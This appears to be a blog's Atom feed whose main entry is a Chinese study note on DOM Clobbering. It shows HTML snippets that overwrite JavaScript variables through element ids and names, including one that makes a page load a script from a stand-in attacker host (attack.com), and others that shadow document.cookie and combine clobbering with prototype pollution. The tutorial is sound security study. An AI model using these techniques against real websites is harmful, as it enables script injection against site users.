<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>kaikaix</title>
  
  <subtitle>小白</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-10-13T10:36:48.657Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>kaikaix</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>前端安全8-DOM Clobbering（笔记）</title>
    <link href="http://example.com/2023/10/13/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A88-DOM-Clobbering%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>http://example.com/2023/10/13/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A88-DOM-Clobbering%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-10-12T18:08:21.000Z</published>
    <updated>2023-10-13T10:36:48.657Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在这一章的攻击手法是通过改变DOM，然后js会对DOM进行操作造成的漏洞，干解释还是太干燥了，还是上代码吧</p><ul><li><a href="https://aszx87410.github.io/beyond-xss/ch3/dom-clobbering/">https://aszx87410.github.io/beyond-xss/ch3/dom-clobbering/</a><span id="more"></span><h1 id="操作带id的tag"><a href="#操作带id的tag" class="headerlink" title="操作带id的tag"></a>操作带id的tag</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;button id=&quot;btn&quot;&gt;click me&lt;/button&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    // TODO: add click event listener to button</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>上面的代码应该怎么对这个button进行操作呢，比如让他弹窗。<br>下面给出代码<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn&#x27;</span>)</span><br><span class="line">  .<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="number">1</span>)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>但是其实并不需要<code>document.getElementById</code>，<code>window.btn</code>也可以直接获取到，然后因为scope的原因，可以直接用<code>btn</code>访问，什么是scope作用域可以参考下面的文章<br><a href="https://www.jianshu.com/p/e5ca92d68daa">https://www.jianshu.com/p/e5ca92d68daa</a><br>所以直接用下面的代码就行了<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">btn.<span class="property">onclick</span>=<span class="function">()=&gt;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>根据官方文档 <a href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object">https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object</a><br><code>embed</code>, <code>form</code>, <code>img</code>, and <code>object</code>这几个标签的<code>name</code>属性也是可以被window直接获取的<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">name</span>=<span class="string">&quot;a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;b&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">&quot;c&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">name</span>=<span class="string">&quot;d&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2023/10/13/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A88-DOM-Clobbering%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt></li></ul><h1 id="DOM-Clobbering入门"><a href="#DOM-Clobbering入门" class="headerlink" title="DOM Clobbering入门"></a>DOM Clobbering入门</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>留言板<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    你的留言：<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;TEST_MODE&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;TEST_SCRIPT_SRC&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://attack.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">TEST_MODE</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// load test script</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">      script.<span class="property">src</span> = <span class="variable language_">window</span>.<span class="property">TEST_SCRIPT_SRC</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样子<code>script.src = window.TEST_SCRIPT_SRC</code>就会加载到a标签的href了，这里为什么不会把<code>&lt;a id=&quot;TEST_SCRIPT_SRC&quot; href=&quot;http://attack.com&quot;&gt;&lt;/a&gt;</code>赋值给<code>script.src</code>呢，这里的实际操作其实是<br><code>script.src = TEST_SCRIPT_SRC.toString()</code><br>这里有一个小trick，当标签是<code>&lt;a&gt;</code>或者<code>&lt;base&gt;</code>，toString()会返回他们的href</p><p>当变量已经存在的时候，就无法通过id进行覆盖了<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    TEST_MODE = 1</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;TEST_MODE&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">window</span>.<span class="property">TEST_MODE</span>) <span class="comment">// 1</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="多层的DOM-Clobbering"><a href="#多层的DOM-Clobbering" class="headerlink" title="多层的DOM Clobbering"></a>多层的DOM Clobbering</h1><p>在上一节只是覆盖单个变量，当需要覆盖对象应该如何操作，比如覆盖掉<code>config.isTest</code>，有几种方法进行覆盖</p><ol><li><p>form</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;isTest&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;isProd&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    console.log(config) // <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    console.log(config.isTest) // <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;isTest&quot;</span> /&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    console.log(config.isProd) // <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;isProd&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这种方法有一种缺陷，无法使用上一节讲的<code>&lt;a&gt;</code>或者<code>&lt;base&gt;</code>标签进行toString的覆盖，只能说是覆盖<code>config.isTest.value</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;enviroment&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(config.<span class="property">enviroment</span>.<span class="property">value</span>) <span class="comment">// test</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>HTMLCollection<br>这种方法在firefox上不可用，只能在chrome上用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://123&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span> <span class="attr">name</span>=<span class="string">&quot;apiUrl&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://huli.tw&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当有两个相同的id的时候，就会生成<code>HTMLCollection</code><br><img src="/2023/10/13/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A88-DOM-Clobbering%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt><br>可以看到可以通过name属性来获取到值，当然还有其他的<br><img src="/2023/10/13/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A88-DOM-Clobbering%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/3.png" alt><br>通过<code>config.config</code>可以获取到第一个，<code>config.apiUrl</code>可以获取到第二个，接下来的操作就和上一节一样了</p></li></ol><p>覆盖三层的话就可以把两个<code>&lt;a&gt;</code>改为<code>&lt;form&gt;</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;config&quot;</span> <span class="attr">name</span>=<span class="string">&quot;prod&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;apiUrl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(config.<span class="property">prod</span>.<span class="property">apiUrl</span>.<span class="property">value</span>) <span class="comment">//123</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><h1 id="更多层的DOM-Clobbering"><a href="#更多层的DOM-Clobbering" class="headerlink" title="更多层的DOM Clobbering"></a>更多层的DOM Clobbering</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;config&quot;</span> <span class="attr">srcdoc</span>=<span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="tag">    &lt;a id=&quot;apiUrl&quot;&gt;&lt;/a&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">  &#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(config.<span class="property">apiUrl</span>) <span class="comment">// &lt;a id=&quot;apiUrl&quot;&gt;&lt;/a&gt;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">500</span>)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以通过iframe创建更多的层级，用<code>setTimeout</code>是因为并不是同步加载的<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;moreLevel&quot;</span> <span class="attr">srcdoc</span>=<span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="tag">    &lt;form id=&quot;config&quot;&gt;&lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">    &lt;form id=&quot;config&quot; name=&quot;prod&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">      &lt;input name=&quot;apiUrl&quot; value=&quot;123&quot; /&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">    &lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">  &#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(moreLevel.<span class="property">config</span>.<span class="property">prod</span>.<span class="property">apiUrl</span>.<span class="property">value</span>) <span class="comment">//123</span></span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">500</span>)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="拓展攻击面"><a href="#拓展攻击面" class="headerlink" title="拓展攻击面"></a>拓展攻击面</h1><p>前面几节的攻击手法都是攻击<code>window</code>下面的变量，但是他有几个标签属性可以影响到<code>document</code><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">cookie</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">name</span>=<span class="string">lastElementChild</span>&gt;</span>I am first child<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>I am last child<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">embed</span> <span class="attr">name</span>=<span class="string">getElementById</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>) <span class="comment">// &lt;img name=&quot;cookie&quot;&gt;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#test&#x27;</span>).<span class="property">lastElementChild</span>) <span class="comment">// &lt;div&gt;I am last child&lt;/div&gt;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">getElementById</span>) <span class="comment">// &lt;embed name=getElementById&gt;&lt;/embed&gt;</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>与原型链污染搭配一起使用，就可以达到污染cookie的效果<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">cookie</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 先假設我們可以 pollute 成 function</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span> = <span class="function">() =&gt;</span> <span class="string">&#x27;a=1&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`cookie: <span class="subst">$&#123;<span class="variable language_">document</span>.cookie&#125;</span>`</span>) <span class="comment">// cookie: a=1</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><code>Object.prototype.toString = () =&gt; &#39;a=1&#39;</code>是匿名函数的使用，让<code>toString</code>返回字符串<code>a=1</code></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在这一章的攻击手法是通过改变DOM，然后js会对DOM进行操作造成的漏洞，干解释还是太干燥了，还是上代码吧&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://aszx87410.github.io/beyond-xss/ch3/dom-clobbering/&quot;&gt;https://aszx87410.github.io/beyond-xss/ch3/dom-clobbering/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</summary>
    
    
    
    <category term="前端安全" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>用codeql分析JDBC反序列化</title>
    <link href="http://example.com/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
